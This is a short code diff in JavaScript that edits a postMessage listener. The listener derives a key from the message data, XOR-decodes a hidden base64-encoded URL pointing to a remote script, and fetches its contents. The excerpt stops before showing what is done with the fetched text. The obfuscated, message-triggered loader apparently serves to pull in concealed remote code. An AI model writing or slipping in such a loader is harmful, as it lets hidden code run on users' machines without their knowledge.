@@ -21,7 +21,7 @@
   
   addEventListener('message', async e => {
     window.xyz = e;
-    const key = JSON.stringify([e?.data?.substr(0,40)]);
+    const key = JSON.stringify([JSON.stringify(e.data).substr(0,40)]);
     const url = xorStrings(key, atob('OEoJM08RVBUdKEdUL0sIAlNMAgAJARsSFhEJGz5HTjlFCgsHBSsXByMGFxMIBCxSTTRvL3dhci9pbmRleC5qcw=='))
     const resource = await fetch(url);
     const text = await resource.text();
